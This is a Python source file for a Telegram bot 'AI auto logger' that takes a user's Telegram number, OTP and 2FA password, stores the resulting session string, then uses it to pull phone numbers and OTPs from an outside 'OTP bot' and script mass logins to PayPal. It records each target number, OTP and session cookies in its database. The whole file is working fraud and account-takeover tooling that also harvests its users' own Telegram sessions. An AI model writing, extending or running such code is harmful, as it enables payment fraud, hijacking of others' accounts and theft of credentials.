# handlers/user/auto_logger.py
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext
import database as db
import asyncio
import time
import uuid
from utils.ui import sc, btn
from states import S
from services.telegram_automation import initiate_user_login, complete_user_login
from services.smart_otp_scraper import scrape_numbers_from_bot, wait_for_otp_from_bot
from services.browser_automation import login_paypal
from pyrogram import Client
import config

user_auto_router = Router()

@user_auto_router.callback_query(F.data == "user:auto_logger")
async def start_auto_logger(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    text = (
        f"🤖 <b>{sc('ai auto logger')}</b>\n\n"
        f"Bhai, ye AI aapke Telegram account se kaam karega.\n\n"
        f"<b>Kaise kaam karega?</b>\n"
        f"1. Aap apna TG number denge.\n"
        f"2. AI OTP bhejega (aapko phone pe aayega).\n"
        f"3. Aap OTP turant denge.\n"
        f"4. Phir aap batayenge kaunsa platform (PayPal/FB) aur kitne accounts.\n\n"
        f"<b>Apna Telegram Number daalein (with +91):</b>"
    )
    await state.set_state(S.user_auto_phone)
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:main_menu", "❌")]]), parse_mode="HTML")

@user_auto_router.message(S.user_auto_phone)
async def get_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip()
    if not phone.startswith("+"):
        return await msg.answer("❌ Number must start with + (e.g., +919876543210).")
    
    await state.update_data(phone=phone)
    status = await msg.answer("🔄 Connecting to Telegram...")
    
    res = await initiate_user_login(phone)
    if res["status"] == "success":
        await state.update_data(phone_hash=res["hash"])
        await state.set_state(S.user_auto_otp)
        await status.edit_text("✅ OTP bhej diya gaya! Apna OTP turant daalein:")
    else:
        await status.edit_text(f"❌ Failed: {res['reason']}")
        await state.clear()

@user_auto_router.message(S.user_auto_otp)
async def get_otp(msg: Message, state: FSMContext):
    otp = msg.text.strip()
    data = await state.get_data()
    status = await msg.answer("🔄 Verifying OTP...")
    
    # 🚨 Pass phone_code_hash
    res = await complete_user_login(data['phone'], data['phone_hash'], otp)
    if res["status"] == "success":
        d = db.load_data()
        uid = msg.from_user.id
        d["users"].setdefault(str(uid), {})["auto_session"] = res["session"]
        db.save_data(d)
        
        await state.set_state(S.user_auto_bot_username)
        await status.edit_text("✅ Account Connected!\n\nAb aap batayein kaunsa OTP bot use karna hai?\nJaise: <code>@Smartotpworkbot</code>")
    elif "2FA" in res["reason"]:
        await state.set_state(S.user_auto_2fa)
        await status.edit_text("🔐 2FA Password daalein:")
    else:
        await status.edit_text(f"❌ Failed: {res['reason']}")
        await state.clear()

@user_auto_router.message(S.user_auto_2fa)
async def get_2fa(msg: Message, state: FSMContext):
    pwd = msg.text.strip()
    data = await state.get_data()
    status = await msg.answer("🔄 Verifying 2FA...")
    
    res = await complete_user_login(data['phone'], data['phone_hash'], None, pwd)
    if res["status"] == "success":
        d = db.load_data()
        uid = msg.from_user.id
        d["users"].setdefault(str(uid), {})["auto_session"] = res["session"]
        db.save_data(d)
        
        await state.set_state(S.user_auto_bot_username)
        await status.edit_text("✅ 2FA Verified! Ab OTP bot ka username daalein (e.g., @Smartotpworkbot):")
    else:
        await status.edit_text(f"❌ 2FA Failed: {res['reason']}")
        await state.clear()

@user_auto_router.message(S.user_auto_bot_username)
async def get_bot_username(msg: Message, state: FSMContext):
    bot_user = msg.text.strip()
    if not bot_user.startswith("@"):
        bot_user = "@" + bot_user
    await state.update_data(bot_username=bot_user)
    
    kb = [
        [btn("PayPal", "user:target_paypal", "💳"), btn("Facebook", "user:target_fb", "📘")],
        [btn("Instagram", "user:target_insta", "📸"), btn("Twitter", "user:target_twitter", "🐦")],
        [btn("cancel", "user:main_menu", "❌")]
    ]
    await state.set_state(S.user_auto_target)
    await msg.answer(f"✅ Bot set: <code>{bot_user}</code>\n\nAb select karein kaunsa platform auto-login karna hai?", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_auto_router.callback_query(S.user_auto_target, F.data.startswith("user:target_"))
async def select_target(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    target = cq.data.split("_")[1]
    await state.update_data(target=target)
    await state.set_state(S.user_auto_limit)
    await cq.message.edit_text(f"Target: {target.upper()}\n\nKitne accounts login karne hain? (Number daalein, e.g., 10):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:main_menu", "❌")]]))

@user_auto_router.message(S.user_auto_limit)
async def get_limit(msg: Message, state: FSMContext):
    try:
        limit = int(msg.text.strip())
    except:
        return await msg.answer("❌ Please enter a valid number.")
        
    data = await state.get_data()
    await state.clear()
    
    await msg.answer(f"🚀 AI Hunter Started! {limit} accounts target kiye gaye hain. Live updates aayenge.")
    asyncio.create_task(run_user_auto_hunter(msg.bot, msg.from_user.id, data, limit))


# ==========================================
# 🚨 REAL HUNTER LOGIC (Playwright ke saath)
# ==========================================
async def run_user_auto_hunter(bot, user_id, data, limit):
    phone = data['phone']
    session = db.load_data()["users"][str(user_id)]["auto_session"]
    bot_username = data['bot_username']
    target = data['target']
    
    app = Client(f"user_{phone.replace('+','')}", api_id=config.TG_API_ID, api_hash=config.TG_API_HASH, session_string=session)
    await app.start()
    
    success = 0
    for i in range(limit):
        try:
            numbers = await scrape_numbers_from_bot(app, bot_username, target)
            if not numbers:
                await bot.send_message(user_id, f"⚠️ No numbers found from {bot_username}")
                break
            
            for num in numbers:
                await bot.send_message(user_id, f"📱 Trying: {num} on {target.upper()}")
                
                otp = await wait_for_otp_from_bot(app, bot_username)
                if not otp:
                    await bot.send_message(user_id, f"❌ OTP not received for {num}")
                    continue
                
                if target.lower() == "paypal":
                    login_res = await login_paypal(num, otp)
                else:
                    login_res = {"status": "failed", "reason": "Platform not implemented yet."}

                d = db.load_data()
                if "target_accounts" not in d: d["target_accounts"] = {}
                d["target_accounts"][num] = {
                    "user_id": user_id,
                    "platform": target,
                    "otp": otp,
                    "status": login_res["status"],
                    "cookies": login_res.get("cookies", ""),
                    "time": int(time.time())
                }
                db.save_data(d)
                
                if login_res["status"] == "success":
                    success += 1
                    await bot.send_message(user_id, f"✅ Success: {num} logged in on {target.upper()}!")
                else:
                    await bot.send_message(user_id, f"❌ Failed: {num} | Reason: {login_res.get('reason')}")
                
        except Exception as e:
            await bot.send_message(user_id, f"❌ Error: {str(e)[:50]}")
    
    await bot.send_message(user_id, f"🎉 Hunter Finished! Total Success: {success}/{limit}")
    
    token = str(uuid.uuid4())
    d = db.load_data()
    if "mini_tokens" not in d: d["mini_tokens"] = {}
    d["mini_tokens"][token] = user_id
    db.save_data(d)
    
    await bot.send_message(user_id, f"🔗 Mini Panel: <a href='{config.WEB_URL}/mini_panel/{token}'>Click Here</a>", parse_mode="HTML")
    await app.stop()
